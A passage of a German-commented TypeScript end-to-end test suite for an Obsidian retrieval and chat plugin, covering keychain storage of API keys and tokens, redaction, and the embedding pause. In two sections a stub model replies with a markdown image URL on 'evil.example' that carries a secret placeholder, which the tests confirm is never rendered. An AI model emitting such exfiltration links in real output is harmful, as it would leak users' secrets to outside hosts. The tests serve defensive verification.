          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          await p.resolveAndReconnectChat();
          await p.resolveAndReconnectEmbedder();
          return {
            key: ((await p.llm.resolve()).config || {}).apiKey, model: p.chatModelInUse, active: p.activeChatEndpoint,
            embModel: p.embeddingModelInUse, embActive: p.activeEmbeddingEndpoint,
          };
        `);
        (m1 as Record<string, unknown>).calls = (await fakeManagerAufrufe(main)).map((a) => `${a.arg}:${String(a.caller)}`).join(",");
        record(MGR_PUNKTE[0]!,
          m1.key === "w8-schluessel" && m1.model === MGR_MODEL && String(m1.calls).includes("chat:vault-retrieval"),
          `Modell ${String(m1.model)} · Schlüssel ${m1.key === "w8-schluessel" ? "vom Manager" : String(m1.key)} · Aufrufe ${String(m1.calls)}`);

        const m2 = await main.evaluate<Record<string, unknown>>(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          p.settings.chatChoice = { model: "w8-gewaehltes-modell" };
          await p.resolveAndReconnectChat();
          return { model: p.chatModelInUse };
        `);
        record(MGR_PUNKTE[1]!, m2.model === "w8-gewaehltes-modell", `Modell ${String(m2.model)} (Standard ${MGR_MODEL})`);

        record(MGR_PUNKTE[2]!,
          m1.embActive === null && m1.embModel === MGR_EMB_MODEL,
          `active=${String(m1.embActive)} · Embedding-Modell ${String(m1.embModel)} (Index trägt ein anderes)`);

        // Die Einstellungen leben seit 1.13 in einem eigenen Target (liesManagerSicht). Gegenprobe: ohne Manager keine
        // Bausteinzeile und lokale Zeilen da — sonst misst der Punkt nur den Produktnamen im Seitentext.
        const mitMgr = (await liesManagerSicht(main, port, vault)) ?? { baustein: false, rows: -1 };
        const gegenOk = ohneMgr !== null && !ohneMgr.baustein && ohneMgr.rows > 0;
        record(MGR_PUNKTE[3]!, mitMgr.baustein && mitMgr.rows === 0 && gegenOk,
          `mit Manager: Bausteinzeile ${mitMgr.baustein ? "da" : "fehlt"} · ${mitMgr.rows} lokale Zeilen; Gegenprobe ohne Manager: Bausteinzeile ${ohneMgr?.baustein ? "DA" : "fehlt (richtig)"} · ${ohneMgr?.rows ?? "?"} lokale Zeilen`);

        const disk = await main.evaluate<string>(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          await p.saveSettings();
          return await app.vault.adapter.read(app.vault.configDir + "/plugins/" + ${JSON.stringify(PLUGIN_ID)} + "/data.json");
        `);
        const leak = disk.includes("w8-schluessel") || disk.includes(MGR_MODEL) || disk.includes(MGR_EMB_MODEL);
        record(MGR_PUNKTE[5]!, !leak, leak ? "Manager-Schlüssel oder -Modell steht in data.json" : "data.json trägt nur die Nutzerwahl (chatChoice) und die lokalen Listen");
      } finally {
        await main.evaluate(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          p.settings.chatChoice = {}; p.settings.embeddingChoice = {};
          await p.saveSettings();
        `);
        await entferneFakeManager(main, { pluginId: MGR });
      }
      const m5 = await main.evaluate<Record<string, unknown>>(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        await p.resolveAndReconnectChat();
        await p.resolveAndReconnectEmbedder();
        return { model: p.chatModelInUse, key: ((await p.llm.resolve()).config || {}).apiKey || "", emb: p.embeddingModelInUse };
      `);
      record(MGR_PUNKTE[4]!,
        m5.model === mgrLocal.chatModel && m5.key !== "w8-schluessel" && m5.emb !== MGR_EMB_MODEL,
        `Chat-Modell ${String(m5.model)} · Embedding-Modell ${String(m5.emb)}`);
    }


    } // Ende vorlauf

    // --- 7e1. MCP-Token im Schlüsselbund (Welle 22) ---------------------------------------------
    // Erzeugen und Neu-Erzeugen laufen ohne laufenden Server (mcpEnabled ist im Fixture aus). Gegenprobe im selben Zug:
    // vor dem Erzeugen steht nichts im Schlüsselbund, danach trägt es genau das Token im Speicher und data.json bleibt leer.
    if (nur === null) {
      const tok = await main.evaluate<Record<string, unknown>>(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        const id = "${PLUGIN_ID}-mcp-token";
        const vorher = app.secretStorage.getSecret(id) || "";
        p.settings.mcpToken = ""; p.mcpTokenInFile = ""; app.secretStorage.setSecret(id, "");
        const t1 = p.ensureMcpToken();
        await p.saveSettings();
        const file1 = JSON.parse(await app.vault.adapter.read(app.vault.configDir + "/plugins/" + ${JSON.stringify(PLUGIN_ID)} + "/data.json")).mcpToken;
        const store1 = app.secretStorage.getSecret(id) || "";
        await p.rotateMcpToken();
        const t2 = p.settings.mcpToken;
        const file2 = JSON.parse(await app.vault.adapter.read(app.vault.configDir + "/plugins/" + ${JSON.stringify(PLUGIN_ID)} + "/data.json")).mcpToken;
        const store2 = app.secretStorage.getSecret(id) || "";
        // aufraeumen: Fixture-Zustand = kein Token
        p.settings.mcpToken = ""; p.mcpTokenInFile = ""; app.secretStorage.setSecret(id, "");
        await p.saveSettings();
        return { vorher, t1, file1, store1, t2, file2, store2 };
      `);
      const ok = typeof tok.t1 === "string" && /^[0-9a-f]{32}$/.test(tok.t1) && tok.store1 === tok.t1 && tok.file1 === ""
        && tok.t2 !== tok.t1 && tok.store2 === tok.t2 && tok.file2 === "";
      record(MCP_TOKEN_PUNKT, ok,
        `erzeugt ${String(tok.t1).length} Zeichen · Schlüsselbund = Speicher: ${tok.store1 === tok.t1} · data.json leer: ${tok.file1 === ""}; neu erzeugt: anders ${tok.t2 !== tok.t1}, Schlüsselbund folgt ${tok.store2 === tok.t2}, data.json leer ${tok.file2 === ""}`);
    }

    // --- 7e1b. Chat-Antworten als Markdown (Welle 22) -----------------------------------------------
    // Eigener Stub mit einer Markdown-Antwort samt Fernbild: gemessen wird die fertige Darstellung im Panel (Liste, Fettung),
    // dass das Fernbild nicht geladen wird (Entschärfung) und dass die eigene Frage Text bleibt. Chat-Zeilen werden nach dem Lauf
    // zurückgesetzt wie in den anderen Stub-Abschnitten.
    if (nur === null) {
      const mdStub = await startLlmStub({ models: ["fake-model"], antwort: () => "**fett** und eine Liste:\n\n- eins\n- zwei\n\n![x](https://evil.example/?d=1)" });
      const gesichert = await main.evaluate<unknown>(`return JSON.parse(JSON.stringify(app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings.chatEndpoints));`);
      try {
        await main.evaluate(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          p.settings.chatEndpoints = [{ url: ${JSON.stringify(mdStub.url)}, model: "fake-model" }];
          p.llm.invalidate(); await p.resolveAndReconnectChat();
          await p.openHub("chat"); await new Promise(r => setTimeout(r, 600));
          document.querySelector(".vault-rag-chat-new")?.click();
          const ta = document.querySelector(".vault-rag-chat-input");
          ta.value = "Frage als Text"; ta.dispatchEvent(new Event("input", { bubbles: true }));
          document.querySelector(".vault-rag-chat-send").click();
          return true;`);
        const md = await pollUntil<{ strong: number; li: number; img: number; evil: number; user: string; userMd: boolean }>(main, `
          const a = document.querySelector(".vault-rag-chat-msg.is-assistant.is-markdown");
          const u = document.querySelector(".vault-rag-chat-msg.is-user");
          if (!a || !a.querySelector("li")) return null;
          return { strong: a.querySelectorAll("strong").length, li: a.querySelectorAll("li").length, img: a.querySelectorAll("img").length,
                   evil: [...a.querySelectorAll("img")].filter(i => (i.getAttribute("src") || "").includes("evil.example")).length,
                   user: u ? u.textContent : "", userMd: !!(u && u.classList.contains("is-markdown")) };`, 20_000, 250);
        record(CHAT_MD_PUNKT, !!md && md.strong >= 1 && md.li === 2 && md.evil === 0 && md.user === "Frage als Text" && !md.userMd,
          md ? `<strong> ${md.strong} · <li> ${md.li} · Fernbild-Quellen ${md.evil} (img gesamt ${md.img}) · Frage ${md.userMd ? "ALS MARKDOWN" : "als Text"}` : "keine gerenderte Antwort in 20 s");
      } finally {
        await main.evaluate(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          document.querySelector(".vault-rag-chat-new")?.click();
          p.settings.chatEndpoints = ${JSON.stringify(gesichert)};
          await p.saveSettings(); p.llm.invalidate(); await p.resolveAndReconnectChat();
          return true;`);
        await mdStub.stop();
      }
    }

    // --- 7e1c. Embedding-Zähler (Welle 22) -------------------------------------------------------
    // Gegenprobe im selben Zug: vor der Suche steht „api“ nicht (oder niedriger) in der Zählung; danach ist es um genau eine
    // Anfrage höher. Der Embedder antwortet in der Stub-Lage vom zentralen Stub, die Suche selbst sagt nichts über Semantik.
    if (nur === null) {
      const z = await main.evaluate<{ vor: number; nach: number; labels: string[]; cmd: boolean }>(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        const lese = () => (p.embedCounter.snapshot().find(x => x.label === "api") || { requests: 0 }).requests;
        const vor = lese();
        await p.api.search("Zaehler-Probe");
        const nach = lese();
        const cmd = app.commands.executeCommandById("vault-retrieval:show-embedding-requests");
        return { vor, nach, labels: p.embedCounter.snapshot().map(x => x.label), cmd: cmd !== false };`);
      record(EMBED_ZAEHLER_PUNKT, z.nach === z.vor + 1 && z.cmd, `„api“ ${z.vor} → ${z.nach} · Etiketten: ${z.labels.join(", ")} · Befehl ${z.cmd ? "läuft" : "FEHLT"}`);
    }

    // --- 7e1d. Embedding-Pause (Welle 22, Spec 2026-09-17 §6.4) ---------------------------------------
    // Gezählt wird am Engpass (`embedCounter`, Etiketten je Aufrufer): „0 Anfragen“ gilt nur, wenn derselbe Zähler nach dem
    // Fortsetzen steigt — sonst wäre die Null auch mit einem Zähler an der falschen Stelle entstanden (CORE-TEST-20).
    // Der Reindex-Halt an der Gruppengrenze ist hier NICHT messbar (der Staging-Vault passt in eine Gruppe): belegt ihn der
    // Unit-Test (tests/embedding_pause_gate.test.ts, Zeile für Zeile gleich).
    if (nur === null) {
      const NOTE = "Notes/Atomic notes.md";
      const total = `p.embedCounter.snapshot().reduce((n, x) => n + x.requests, 0)`;
      const vorher = await main.evaluate<{ text: string; showSaved: boolean }>(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        const text = await app.vault.adapter.read(${JSON.stringify(NOTE)});
        const showSaved = p.settings.showStatusBar;
        p.settings.showStatusBar = false; p.setStatusBarVisible(false);
        p.setEmbeddingPaused(false);
        return { text, showSaved };`);
      try {
        // 1 · Befehl
        const sb = await main.evaluate<{ paused: boolean; text: string; pressed: string | null; role: string | null }>(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          app.commands.executeCommandById("vault-retrieval:pause-embedding");
          await new Promise(r => setTimeout(r, 400));
          const el = p.statusBarEl;
          return { paused: p.embeddingPaused(), text: el ? el.textContent : "", pressed: el ? el.getAttribute("aria-pressed") : null, role: el ? el.getAttribute("role") : null };`);
        record(PAUSE_PUNKTE[0]!, sb.paused && sb.text.includes("⏸") && sb.pressed === "true" && sb.role === "button",
          `pausiert=${String(sb.paused)} · Text „${sb.text}“ · aria-pressed=${String(sb.pressed)} · role=${String(sb.role)}`);

        const z0 = await main.evaluate<number>(`const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]; return ${total};`);

        // 2 · Such-Tab
        await main.evaluate(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          await p.openHub("search"); await new Promise(r => setTimeout(r, 500));
          const i = document.querySelector(".vault-rag-search-input");
          i.value = "pausierte suche"; i.dispatchEvent(new Event("input", { bubbles: true }));
          await new Promise(r => setTimeout(r, 900));
          return true;`);
        const es = await main.evaluate<{ empty: number; cta: number; offlineRow: number; text: string }>(`
          const root = document.querySelector(".vault-rag-search-input")?.parentElement;
          const e = root ? [...root.querySelectorAll(".vault-rag-empty")] : [];
          return { empty: e.length, cta: e.reduce((n, x) => n + x.querySelectorAll("button.mod-cta").length, 0),
                   offlineRow: root ? [...root.querySelectorAll(".vault-rag-search-state")].length : 0, text: e[0] ? e[0].textContent : "" };`);
        record(PAUSE_PUNKTE[1]!, es.empty === 1 && es.cta === 1 && es.offlineRow === 0, `Empty-States ${es.empty} · CTA ${es.cta} · Offline-Zeilen ${es.offlineRow} · „${es.text.slice(0, 60)}“`);

        // 3 · Chat-Tippen
        await main.evaluate(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          await p.openHub("chat"); await new Promise(r => setTimeout(r, 500));
          const ta = document.querySelector(".vault-rag-chat-input");
          ta.value = "Frage waehrend der Pause"; ta.dispatchEvent(new Event("input", { bubbles: true }));
          await new Promise(r => setTimeout(r, 1000));
          return true;`);
        const z1 = await main.evaluate<number>(`const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]; return ${total};`);
        record(PAUSE_PUNKTE[2]!, z1 === z0, `Zähler ${z0} → ${z1} nach Suche im Such-Tab und Tippen im Chat`);

        // 4 · Änderung während der Pause
        const q = await main.evaluate<{ pending: number }>(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          const f = app.vault.getAbstractFileByPath(${JSON.stringify(NOTE)});
          await app.vault.modify(f, ${JSON.stringify(vorher.text)} + "\\nPause-Probe.\\n");
          const t0 = Date.now();
          while (Date.now() - t0 < 9000 && p.embeddingProgress.pendingNotes < 1) await new Promise(r => setTimeout(r, 250));
          return { pending: p.embeddingProgress.pendingNotes };`);
        const z2 = await main.evaluate<number>(`const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]; return ${total};`);
        record(PAUSE_PUNKTE[3]!, q.pending >= 1 && z2 === z0, `pendingNotes ${q.pending} · Zähler ${z0} → ${z2}`);

        // 5 · Fortsetzen
        const r = await main.evaluate<{ pending: number; after: number; resumed: boolean }>(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          app.commands.executeCommandById("vault-retrieval:resume-embedding");
          const t0 = Date.now();
          while (Date.now() - t0 < 15000 && (p.embeddingProgress.pendingNotes > 0 || ${total} <= ${z0})) await new Promise(r => setTimeout(r, 250));
          return { pending: p.embeddingProgress.pendingNotes, after: ${total}, resumed: !p.embeddingPaused() };`);
        record(PAUSE_PUNKTE[4]!, r.resumed && r.pending === 0 && r.after > z0, `fortgesetzt=${String(r.resumed)} · pendingNotes ${r.pending} · Zähler ${z0} → ${r.after}`);
      } finally {
        await main.evaluate(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          p.setEmbeddingPaused(false);
          const f = app.vault.getAbstractFileByPath(${JSON.stringify(NOTE)});
          if (f) await app.vault.modify(f, ${JSON.stringify(vorher.text)});
          // Der Restore löst nach dem Debounce ein Embedding aus: abwarten, solange der Stub noch der Endpunkt ist.
          await new Promise(r => setTimeout(r, p.settings.debounceMs + 1500));
          { const t0 = Date.now(); while ((p.embeddingProgress.isEmbedding || p.embeddingProgress.pendingNotes > 0) && Date.now() - t0 < 10000) await new Promise(r => setTimeout(r, 200)); }
          p.settings.showStatusBar = ${JSON.stringify(vorher.showSaved)};
          p.setStatusBarVisible(${JSON.stringify(vorher.showSaved)});
          document.querySelector(".vault-rag-chat-input") && (document.querySelector(".vault-rag-chat-input").value = "");
          return true;`);
      }
    }


    // --- Stub-Lage-Hygiene (Welle 22, Lehre vom 2026-10-14 21:31) ------------------------------------
    // Ein Abbruch hob die Schutzlage auf, und ein Nachlauf (Pending-Queue, Debounce) traf danach den echten Endpunkt. Hier der
    // Beleg für das Aufräumen: ein zweiter Stub steht für den „echten“ Endpunkt und protokolliert jede Anfrage. Gegenprobe zuerst:
    // dieselbe Lage OHNE Aufräumen liefert ihm eine Anfrage — sonst wäre die Null unten auch mit einer blinden Zählung entstanden.
    if (nur === null) {
      const NOTE2 = "Notes/Linking notes.md";
      const echt = await startLlmStub({ models: ["fake-echt"], embeddings: { vektor: Array.from({ length: 256 }, () => 0.0625) } });
      const orig = await main.evaluate<{ text: string; emb: unknown; model: string }>(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        p.setEmbeddingPaused(false);
        return { text: await app.vault.adapter.read(${JSON.stringify(NOTE2)}), emb: JSON.parse(JSON.stringify(p.settings.embeddingEndpoints)), model: p.settings.embeddingEndpoints[0].model };`);
      const lage = (mitSchutz: boolean) => `
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        const f = app.vault.getAbstractFileByPath(${JSON.stringify(NOTE2)});
        await app.vault.modify(f, ${JSON.stringify(orig.text)} + "\\nHygiene-Probe ${mitSchutz ? "mit" : "ohne"}.\\n");   // Debounce-Timer läuft jetzt
        ${mitSchutz ? STUB_LAGE_SCHUTZ.replace("const p = app.plugins.plugins[" + JSON.stringify(PLUGIN_ID) + "];", "") : ""}
        p.settings.embeddingEndpoints[0].url = ${JSON.stringify(echt.url)};     // jetzt zeigt Zeile 1 auf den „echten“ Endpunkt
        p.settings.embeddingEndpoints[0].model = ${JSON.stringify(orig.model)};
        await p.resolveAndReconnectEmbedder();
        await new Promise(r => setTimeout(r, p.settings.debounceMs + 2500));
        return true;`;
      const zaehle = () => echt.anfragen().filter((a) => a.route === "embeddings").length;
      try {
        await main.evaluate(lage(false));
        const ohne = zaehle();
        await main.evaluate(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          p.settings.embeddingEndpoints = ${JSON.stringify(orig.emb)}; await p.saveSettings();
          p.setEmbeddingPaused(false); await p.resolveAndReconnectEmbedder(); return true;`);
        await main.evaluate(lage(true));
        const mit = zaehle() - ohne;
        record(PAUSE_PUNKTE[5]!, ohne >= 1 && mit === 0, `ohne Aufräumen erreichte den „echten“ Endpunkt ${ohne} Anfrage(n), mit Aufräumen ${mit}`);
      } finally {
        await main.evaluate(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          p.setEmbeddingPaused(true);
          p.settings.embeddingEndpoints = ${JSON.stringify(orig.emb)}; await p.saveSettings();
          const f = app.vault.getAbstractFileByPath(${JSON.stringify(NOTE2)});
          if (f) await app.vault.modify(f, ${JSON.stringify(orig.text)});
          for (const t of p.debounceTimers.values()) window.clearTimeout(t);
          p.debounceTimers.clear(); await p.pendingQueue.clear();
          p.setEmbeddingPaused(false); await p.resolveAndReconnectEmbedder(); return true;`).catch(() => undefined);
        await echt.stop().catch(() => undefined);
      }
    }

    // --- 7e2. Verbindungs-Tausch (Welle 15): Schlüsselbund, Neustarts, Schwärzung ---------------
    // Gegen einen FAKE-Endpunkt auf der Node-Seite: er zeichnet Body und Header auf und spiegelt
    // den Platzhalter, den er im gesendeten Text findet, in seine Antwort (wie ein Modell, das die
    // Stelle zitiert). CORS-Kopfzeilen und Preflight, weil das Plugin per XHR aus app://obsidian.md
    // fragt. Die Chat-Liste wird für den Block auf diesen Endpunkt gestellt und im finally
    // zurückgeschrieben.
    if (laeuft("w15")) {
      const W15_KEY = "w15-schluessel-geheim";
      const W15_TOKEN = "Bearer abcdefghijklmnopqrstuvwxyz0123456789";
      let mode: "plain" | "image" = "plain";
      // Zentraler Stub statt eigenem Server: spiegelt den Platzhalter der Anfrage in seine Antwort. Preflight/CORS, Modell-GET
      // und SSE kommen vom Stub (Pfade streng: nur /v1/models und /v1/chat/completions).
      const stub15 = await startLlmStub({
        models: ["fake-model"],
        antwort: (anfrage) => {
          const ph = /\[redacted-[a-z0-9-]+-\d+\]/.exec(anfrage.body)?.[0] ?? "KEIN-PLATZHALTER";
          return mode === "image" ? `Siehe ![x](https://evil.example/?d=${ph}) hier` : `Zitat: ${ph} gewesen`;
        },
      });
      const seen = (): { auth: string | undefined; body: string }[] =>
        stub15.anfragen().filter((a) => a.route === "chat").map((a) => ({ auth: typeof a.header.authorization === "string" ? a.header.authorization : undefined, body: a.body }));
      const url = stub15.url;
      const saved = await main.evaluate<unknown>(`return JSON.parse(JSON.stringify(app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings.chatEndpoints));`);
      try {
        const n1 = await main.evaluate<Record<string, unknown>>(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          p.settings.chatEndpoints = [{ url: ${JSON.stringify(url)}, model: "fake-model", apiKey: ${JSON.stringify(W15_KEY)} }];
          p.llm.invalidate();
          const r = await p.llm.resolve({ force: true });
          await new Promise(res => setTimeout(res, 300));
          await p.saveSettings();
          const disk = await app.vault.adapter.read(app.vault.configDir + "/plugins/" + ${JSON.stringify(PLUGIN_ID)} + "/data.json");
          const row = JSON.parse(disk).chatEndpoints[0] || {};
          return { leak: disk.includes(${JSON.stringify(W15_KEY)}), secretId: row.secretId || null, id: row.id || null, resolvedKey: (r.config || {}).apiKey || null };
        `);
        record(W15_PUNKTE[0]!, n1.leak === false && !!n1.secretId && n1.resolvedKey === W15_KEY,
          `leak=${String(n1.leak)} · secretId=${String(n1.secretId)} · aufgelöster Schlüssel ${n1.resolvedKey === W15_KEY ? "stimmt" : String(n1.resolvedKey)}`);

        const neustarts: string[] = [];
        let ok2 = true;
        for (let i = 1; i <= 2; i++) {
          const r = await main.evaluate<Record<string, unknown>>(`
            await app.plugins.disablePlugin(${JSON.stringify(PLUGIN_ID)});
            await app.plugins.enablePlugin(${JSON.stringify(PLUGIN_ID)});
            await new Promise(res => setTimeout(res, 800));
            const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
            const row = p.settings.chatEndpoints[0] || {};
            const cfg = (await p.llm.resolve({ force: true })).config || {};
            return { secretId: row.secretId || null, plain: row.apiKey || null, key: cfg.apiKey || null };
          `);
          const good = !!r.secretId && !r.plain && r.key === W15_KEY;
          ok2 = ok2 && good;
          neustarts.push(`Neustart ${i}: secretId ${r.secretId ? "da" : "WEG"} · Schlüssel ${r.key === W15_KEY ? "löst auf" : "FEHLT"}`);
        }
        record(W15_PUNKTE[1]!, ok2, neustarts.join(" · "));

        const n3 = await main.evaluate<Record<string, unknown>>(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          const r = await p.chatClient.stream([{ role: "user", content: "Der Zugang ist ${W15_TOKEN} ok." }], () => {}, () => {});
          return { content: r.content };
        `);
        const alle15 = seen();
        const first = alle15[alle15.length - 1];
        record(W15_PUNKTE[2]!, first?.auth === `Bearer ${W15_KEY}`, `Authorization: ${first?.auth === `Bearer ${W15_KEY}` ? "Bearer <Schlüssel aus dem Schlüsselbund>" : String(first?.auth)}`);
        record(W15_PUNKTE[3]!,
          !!first && !first.body.includes("abcdefghijklmnopqrstuvwxyz0123456789") && /\[redacted-/.test(first.body)
            && String(n3.content).includes("abcdefghijklmnopqrstuvwxyz0123456789"),
          `Body ${first && !first.body.includes("abcdefghijklmnopqrstuvwxyz") ? "ohne Token" : "TRÄGT DAS TOKEN"} · Ergebnis ${String(n3.content).includes("abcdefghijklmnopqrstuvwxyz") ? "mit Original" : "OHNE Original"}`);

        // Bild-URL mit Platzhalter: über die echte Chat-Oberfläche, denn dort entscheidet sich, ob
        // aus der restaurierten Antwort ein Element wird, das das Geheimnis ohne Klick verschickt.
        mode = "image";
        await main.evaluate(`
          await app.commands.executeCommandById("vault-retrieval:open-vault-chat");
          await new Promise(r => setTimeout(r, 800));
          const ta = document.querySelector(".vault-rag-chat-input");
          ta.value = "Zeig mir ${W15_TOKEN} als Bild";
          ta.dispatchEvent(new Event("input", { bubbles: true }));
          await new Promise(r => setTimeout(r, 700));
          document.querySelector(".vault-rag-chat-send").click();
        `);
        const fertig = await pollUntil(main,
          `const w = document.querySelector(".vault-rag-chat-working"); return !!w && /✓/.test(w.textContent || "");`,
          60_000, 500).catch(() => false);
        const img = await main.evaluate<{ imgs: number; hasText: boolean }>(`
          // Gezählt wird, was das Geheimnis verschicken könnte: ein img mit der fremden Adresse. Das
          // Chat-Panel trägt andere img (Notiz-Vorschauen) nicht, die Sidebar aber Icons und Avatare.
          const root = document.querySelector(".vault-rag-chat-root") || document.body;
          return { imgs: root.querySelectorAll('img[src*="evil.example"], img[src*="redacted"]').length, hasText: (root.textContent || "").includes("evil.example") };
        `);
        record(W15_PUNKTE[4]!, fertig === true && img.imgs === 0 && img.hasText,
          fertig ? `${img.imgs} img-Element(e) · Antworttext ${img.hasText ? "sichtbar als Text" : "FEHLT"}` : "keine Ergebniszeile in 60 s — nichts gemessen");
        // onResolved (Kit 0.51.3): die Kit-Liste löst nach einer Änderung selbst neu auf, ohne `resolveAndReconnectChat`.
        // Hier wird genau das nachgestellt (invalidate + resolve am Plugin vorbei) und gezählt, ob der offene Tab es erfährt.
        await openSettings(main);
        await new Promise<void>((r) => setTimeout(r, 1500));
        try {
          const hk = await main.evaluate<{ had: boolean; after: number; cached: number }>(`
            const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
            const had = typeof p.chatResolvedHook === "function";
            window.__w15Hook = 0;
            const orig = p.chatResolvedHook;
            p.chatResolvedHook = () => { window.__w15Hook++; if (orig) orig(); };
            p.llm.invalidate();
            await p.llm.resolve();
            await new Promise(r => setTimeout(r, 700));
            const after = window.__w15Hook;
            await p.llm.resolve();
            await new Promise(r => setTimeout(r, 400));
            const cached = window.__w15Hook;
            p.chatResolvedHook = orig;
            return { had, after, cached };
          `);
          record(W15_PUNKTE[5]!, hk.had && hk.after >= 1 && hk.cached === hk.after,
            `Hook ${hk.had ? "im offenen Tab gesetzt" : "FEHLT"} · nach neuer Auflösung ${hk.after}× gerufen · nach gemerkter ${hk.cached - hk.after} weitere`);
        } finally {
          await main.evaluate(`app.setting.close(); return true;`).catch(() => undefined);
        }
      } finally {
        await main.evaluate(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          const cur = p.settings.chatEndpoints[0];
          if (cur && cur.secretId) app.secretStorage.setSecret(cur.secretId, "");
          p.settings.chatEndpoints = ${JSON.stringify(saved)};
          await p.saveSettings();
          p.llm.invalidate();
          await p.resolveAndReconnectChat();
        `);
        await stub15.stop();
      }
    }


    // --- 7e3. Embedding-Schlüssel im Schlüsselbund (Welle 16) -----------------------------------
    // Gegen einen FAKE-Endpunkt (Node-Seite), der Probe (GET) und embed (POST) mit ihrem
    // Authorization-Header aufzeichnet. „Kein apiKey in data.json“ besteht auch bei einem
    // schlüssellosen Embedder — deshalb zusätzlich der Bearer an Probe UND embed, nach zwei
    // Neustarts, und eine Gegenprobe mit einer nicht hydrierten Zeile. Der Treiber baut den Vault
    // nicht aus dem Fixture: Listen und Schlüsselbund werden im finally zurückgesetzt.
    if (laeuft("w16")) {
      const W16_KEY = "w16-embedding-schluessel";
      const W16_CHAT_KEY = "w16-chat-schluessel";
      const stub16 = await startLlmStub({ models: ["qwen3-embedding:8b", "fake-model"], embeddings: { vektor: [0.1, 0.2, 0.3] } });
      const seen16 = (): { method: string; auth: string | undefined }[] =>
        stub16.anfragen().map((a) => ({ method: a.methode, auth: typeof a.header.authorization === "string" ? a.header.authorization : undefined }));
      const url16 = stub16.url;
      const saved16 = await main.evaluate<{ emb: unknown; chat: unknown }>(`
        const s = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings;
        return { emb: JSON.parse(JSON.stringify(s.embeddingEndpoints)), chat: JSON.parse(JSON.stringify(s.chatEndpoints)) };
      `);
      // Klartext-Zustand herstellen (wie ein Vault vor Welle 16) und prüfen, dass er wirklich so auf der Platte steht.
      const setPlain = async (): Promise<boolean> => main.evaluate<boolean>(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        p.settings.embeddingEndpoints = [{ url: ${JSON.stringify(url16)}, model: "qwen3-embedding:8b", apiKey: ${JSON.stringify(W16_KEY)} }];
        p.settings.chatEndpoints = [{ url: ${JSON.stringify(url16)}, model: "fake-model", apiKey: ${JSON.stringify(W16_CHAT_KEY)} }];
        await p.saveSettings();
        const disk = await app.vault.adapter.read(app.vault.configDir + "/plugins/" + ${JSON.stringify(PLUGIN_ID)} + "/data.json");
        return disk.includes(${JSON.stringify(W16_KEY)}) && disk.includes(${JSON.stringify(W16_CHAT_KEY)});
      `);
      const reload = async (): Promise<Record<string, unknown>> => main.evaluate<Record<string, unknown>>(`
        await app.plugins.disablePlugin(${JSON.stringify(PLUGIN_ID)});
        await app.plugins.enablePlugin(${JSON.stringify(PLUGIN_ID)});
        await new Promise(res => setTimeout(res, 1500));
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        const disk = await app.vault.adapter.read(app.vault.configDir + "/plugins/" + ${JSON.stringify(PLUGIN_ID)} + "/data.json");
        const e = p.settings.embeddingEndpoints[0] || {};
        const c = p.settings.chatEndpoints[0] || {};
        return {
          leakEmb: disk.includes(${JSON.stringify(W16_KEY)}), leakChat: disk.includes(${JSON.stringify(W16_CHAT_KEY)}),
          embSecret: e.secretId || null, chatSecret: c.secretId || null, embPlain: e.apiKey || null,
          embedderKey: ((await p.emb.resolve()).source.config || {}).apiKey || null,
        };
      `);
      try {
        if (!(await setPlain())) {
          for (const n of W16_PUNKTE) unmeasured(n, "Vorbedingung nicht herstellbar: der Klartext-Schlüssel steht nicht in data.json");
        } else {
          const r1 = await reload();
          record(W16_PUNKTE[0]!, r1.leakEmb === false && r1.leakChat === false && !!r1.embSecret && !!r1.chatSecret,
            `Leck Embedding=${String(r1.leakEmb)} Chat=${String(r1.leakChat)} · secretId Embedding=${String(r1.embSecret)} Chat=${String(r1.chatSecret)}`);

          const r2 = await reload();
          const r3 = await reload();
          record(W16_PUNKTE[1]!,
            !!r3.embSecret && !r3.embPlain && r3.leakEmb === false && r3.embedderKey === W16_KEY && r2.embedderKey === W16_KEY,
            `Neustart 2: Schlüssel im Embedder ${r2.embedderKey === W16_KEY ? "da" : "FEHLT"} · Neustart 3: secretId ${r3.embSecret ? "da" : "WEG"}, Schlüssel im Embedder ${r3.embedderKey === W16_KEY ? "da" : "FEHLT"}`);

          stub16.loescheMitschnitt();
          await main.evaluate(`
            const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
            await p.resolveAndReconnectEmbedder();
            await p.emb.embedder().embed(["probe"]);
            return true;
          `);
          const gets = seen16().filter((x) => x.method === "GET");
